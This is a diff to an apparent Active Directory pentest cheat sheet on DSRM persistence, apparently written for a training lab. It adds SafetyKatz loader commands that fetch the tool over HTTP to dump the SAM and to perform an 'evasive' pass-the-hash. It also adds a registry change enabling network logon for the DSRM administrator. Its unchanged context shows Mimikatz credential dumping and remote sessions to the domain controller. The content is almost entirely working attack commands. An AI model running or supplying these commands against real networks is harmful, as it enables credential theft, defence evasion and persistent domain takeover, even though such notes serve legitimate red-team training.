@@ -13,6 +13,8 @@ Require Domain Admin privileges
 ```powershell
 # dumping from sam - DSRM local Administrator hash
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' 
+# Or with SafetyKatz cmd
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "token::elevate" "lsadump::evasive-sam" "exit"
 ```
 
 ```powershell
@@ -33,6 +35,8 @@ Get-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminL
 
 # If exists set his value to 2
 Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehavior' -Value 2 -Verbose
+# OR With CMD
+reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
 
 # If does not exist create it and set his value to 2
 New-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehavior' -Value 2 -PropertyType DWORD -Verbose
@@ -40,16 +44,18 @@ New-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminL
 
 ## Passing the hash
 
-```powershell
-# /domain - the domain controller
+<pre class="language-powershell"><code class="lang-powershell"># /domain - the domain controller
 Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator
 /ntlm:a102ad5753f4c441e3af31c97fad86fd 
 /run:powershell.exe"'
-# Set the DC IP in trust list.
-Set-Item WSman:\localhost\Client\TrustedHosts <DC-IP>
+# OR with SafetyKatz
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator /ntlm:&#x3C;DSRM_NTML> /run:cmd.exe" "exit"
+<strong>
+</strong><strong># Set the DC IP in trust list.
+</strong>Set-Item WSman:\localhost\Client\TrustedHosts &#x3C;DC-IP>
 # Check if worked
 ls \\dcorp-dc\C$
-Enter-PSSession -ComputerName <DC-IP> -Authentication NegotiateImplictCredential
-```
+Enter-PSSession -ComputerName &#x3C;DC-IP> -Authentication NegotiateImplictCredential
+</code></pre>
 
 Use `$env:username` to get the logged in username.
